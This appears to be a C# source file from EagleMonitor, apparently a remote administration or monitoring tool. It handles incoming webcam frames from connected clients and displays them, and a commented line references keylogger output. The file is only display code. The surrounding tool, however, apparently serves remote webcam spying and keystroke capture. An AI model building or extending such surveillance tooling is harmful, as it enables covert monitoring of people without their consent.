using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteCameraCapturePacketHandler
    {
        public RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket remoteCameraCapturePacket, ClientHandler clientHandler)
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.hasAlreadyConnected = true;
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.cameraViewerPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                    //ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
                    remoteCameraCapturePacket = null;
                }));
                return;
            }
            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
        }
    }
}
